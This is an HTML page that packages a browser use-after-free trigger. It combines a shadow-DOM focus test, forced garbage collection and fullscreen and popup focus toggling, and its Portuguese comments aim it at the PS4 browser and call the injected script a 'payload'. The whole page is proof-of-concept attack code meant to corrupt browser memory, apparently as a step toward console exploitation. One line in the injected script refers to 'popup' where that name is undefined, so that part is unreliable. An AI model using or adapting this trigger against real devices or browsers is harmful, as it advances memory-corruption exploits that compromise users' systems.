<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Fullscreen Focus Lifecycle Test</title>
</head>
<body>
<button id="run">Run Test</button>
<div id="status">Iframe ready</div>
<iframe id="testFrame" width="300" height="200" style="border:1px solid black;"></iframe>

<script>
var iframe = document.getElementById("testFrame");
var popup = null;
var focusTimer = null;

iframe.onload = function() {
    var doc = iframe.contentDocument;
    doc.open();
    doc.write(
        '<!DOCTYPE html>' +
        '<html>' +
        '<body>' +
        '<h3>Iframe</h3>' +
        '<div id="target" style="width:200px;height:150px;background:red"></div>' +
        '</body>' +
        '</html>'
    );
    doc.close();
};

document.getElementById("run").onclick = function() {
    // 1. Entrar em Fullscreen imediatamente no clique (Essencial para a PS4)
    var frameDocument = iframe.contentDocument;
    var fullscreenElement = frameDocument.documentElement;
    if (fullscreenElement.webkitRequestFullscreen) {
        fullscreenElement.webkitRequestFullscreen();
    } else if (fullscreenElement.requestFullscreen) {
        fullscreenElement.requestFullscreen();
    }

    // 2. Abrir o pop-up
    popup = window.open("", "_blank", "width=400,height=300");
    if (!popup) return;

    // 3. Escrever o payload original do teste no pop-up (Shadow DOM + UAF + GC)
    popup.document.open();
   
    popup.document.write(
        '<!DOCTYPE html>' +
        '<html>' +
        '<body>' +
        '<p>This test passes if it does not crash.</p>' +
        '<div id="host"></div>' +
        '<div id="result"></div>' +
        '<script>' +
        'function gc() {' +
        '    function gcRec(n) {' +
        '        if (n < 1) return {};' +
        '        var temp = {i: "ab" + i + (i / 100000)};' +
        '        temp += "foo";' +
        '        gcRec(n-1);' +
        '    }' +
        '    for (var i = 0; i < 10000; i++) gcRec(10);' +
        '}' +
        'let shadowRoot = host.attachShadow({ mode: "open" });' +
        'let victim = document.createElement("div");' +
        'victim.tabIndex = 0;' +
        'victim.textContent = "Focusable";' +
        'shadowRoot.appendChild(victim);' +
        'victim.focus();' +
        'async function runTest() {' +
        '    document.addEventListener("blur", () => {' +
        '        victim.remove();' +
        '        victim = null;' +
        '        gc();' +
        '    }, true);' +
        '        popup.focus();' +
        '    await new Promise(resolve => window.addEventListener("blur", resolve, { once: true }));' +
        '    await new Promise(resolve => requestAnimationFrame(() => setTimeout(resolve, 0)));' +
        '    result.textContent = "PASS";' +
        '}' +
        'runTest();' +
        '<\/script>' +
        '</body>' +
        '</html>'
    );
    
    popup.document.close();

    // 4. Sequência de alternância de foco
    setTimeout(function() {
        if (!popup || popup.closed) return;        
        window.focus();            
        try {
            iframe.contentWindow.focus();            
        } catch (e) {}

        setTimeout(function() {
              if (popup && !popup.closed) {
                  popup.close();
              }
              focusTimer = setInterval(function() {
                  if (!popup || popup.closed) {
                     clearInterval(focusTimer);
                     iframe.remove();                          
                  }
               }, 20);
         }, 500);
    }, 300);
};

window.onblur = function() {
    document.getElementById("status").innerHTML = "MAIN PAGE BLUR";
};

window.onfocus = function() {
    document.getElementById("status").innerHTML = "MAIN PAGE FOCUS";
};
</script></body>
</html>
